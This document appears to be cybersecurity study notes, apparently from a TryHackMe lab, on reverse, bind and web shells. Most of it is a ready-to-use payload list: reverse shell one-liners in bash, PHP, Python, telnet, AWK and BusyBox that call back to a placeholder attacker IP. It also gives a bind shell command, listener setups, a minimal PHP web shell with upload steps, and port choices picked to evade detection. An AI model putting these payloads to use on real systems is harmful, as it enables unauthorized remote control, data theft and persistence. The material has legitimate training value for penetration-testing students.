# Shells - Remote Access & Command Execution

## What is a Shell?

A shell is software that allows interaction with an operating system, typically through a command-line interface. In cybersecurity, it refers to a session an attacker uses to remotely control a compromised system.

## Shell Use Cases in Attacks

- **Remote System Control**: Execute commands/software remotely
- **Privilege Escalation**: Elevate from limited to administrative access
- **Data Exfiltration**: Read and copy sensitive data
- **Persistence**: Create backdoors for maintained access
- **Post-Exploitation**: Deploy malware, create hidden accounts, delete logs
- **Lateral Movement (Pivoting)**: Use compromised system to access other network targets

---

## Reverse Shell

**Definition**: Target system initiates connection back to attacker's machine. Most popular shell technique due to firewall evasion.

### Setting Up Netcat Listener (Attacker Side)
```bash
nc -lvnp 443
```

**Flags:**
- `-l` - Listen for incoming connection
- `-v` - Verbose mode
- `-n` - Skip DNS resolution (use IP only)
- `-p` - Specify port (443, 80, 8080, 53, 139, 445 blend with legitimate traffic)

### Example Payload (Target Side)
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

**Breakdown:**
1. `rm -f /tmp/f` - Remove existing named pipe
2. `mkfifo /tmp/f` - Create FIFO (named pipe) for bidirectional communication
3. `cat /tmp/f` - Read from pipe
4. `| sh -i 2>&1` - Pipe to interactive shell, redirect errors to stdout
5. `| nc ATTACKER_IP PORT` - Send shell output via Netcat to attacker
6. `>/tmp/f` - Write received commands back to pipe

### Connection Result
```
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
target@tryhackme:~$
```

---

## Bind Shell

**Definition**: Compromised target opens a port and listens for incoming connections, then exposes shell to connecting attacker.

**Note**: Less popular than reverse shells - requires open port on target, easier to detect.

### Setting Up Bind Shell (Target Side)
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

**Key Difference:**
- `nc -l 0.0.0.0 8080` - Netcat listens on all interfaces, port 8080
- Ports below 1024 require elevated privileges

### Connecting to Bind Shell (Attacker Side)
```bash
nc -nv TARGET_IP 8080
```

**Result:**
```
attacker@kali:~$ nc -nv 10.10.13.37 8080
(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
target@tryhackme:~$
```

---

## Reverse Shell Payloads

### Bash

**Standard Reverse Shell:**
```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

**Read Line Method:**
```bash
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
```

**File Descriptor 196:**
```bash
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
```

**File Descriptor 5:**
```bash
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

### PHP

**Using exec:**
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```

**Using shell_exec:**
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```

**Using system:**
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
```

**Using passthru (for binary data):**
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```

**Using popen:**
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
```

### Python

**Export Environment Variables:**
```bash
export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

**Using subprocess:**
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("bash")'
```

**Short version:**
```bash
python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

### Other Payloads

**Telnet:**
```bash
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
```

**AWK:**
```bash
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

**BusyBox:**
```bash
busybox nc ATTACKER_IP 443 -e sh
```

---

## Advanced Listener Tools

### Rlwrap (Enhanced Netcat)
Adds readline features (arrow keys, history) to Netcat:
```bash
rlwrap nc -lvnp 443
```

### Ncat (Improved Netcat)
NMAP's enhanced Netcat with SSL support:

**Standard:**
```bash
ncat -lvnp 443
```

**With SSL encryption:**
```bash
ncat --ssl -lvnp 443
```

### Socat (Socket Relay)
Versatile connection tool for advanced scenarios:
```bash
socat -d -d TCP-LISTEN:443 STDOUT
```

**Flags:**
- `-d -d` - Double verbose output
- `TCP-LISTEN:443` - Create TCP listener on port 443
- `STDOUT` - Direct incoming data to terminal

---

## Web Shells

**Definition**: Scripts uploaded to compromised web servers that execute commands through the web server itself. Hidden within web applications, difficult to detect.

### Simple PHP Web Shell Example
```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

**Usage:**
1. Save as `shell.php`
2. Upload via file upload vulnerability, RFI/LFI, or unauthorized access
3. Access via URL: `http://victim.com/uploads/shell.php?cmd=whoami`

### Popular Web Shells
- **p0wny-shell** - Minimalistic single-file PHP shell
- **b374k shell** - Feature-rich PHP shell with file management
- **c99 shell** - Robust PHP shell with extensive functionality
- **More at**: https://www.r57shell.net/

### Supported Languages
- PHP
- ASP/ASPX
- JSP
- CGI scripts

---

## Key Differences Summary

| Feature | Reverse Shell | Bind Shell | Web Shell |
|---------|--------------|------------|-----------|
| **Connection** | Target → Attacker | Attacker → Target | HTTP requests |
| **Firewall Evasion** | High | Low | Medium |
| **Detection Risk** | Lower | Higher | Varies |
| **Port Required** | Attacker side | Target side | Web server port |
| **Best For** | Bypassing firewalls | Direct access scenarios | Web app compromises |

## Common Ports for Shells
- 443 (HTTPS)
- 80 (HTTP)
- 53 (DNS)
- 8080 (HTTP-Alt)
- 139/445 (SMB)

**Reason**: Blend with legitimate traffic to avoid detection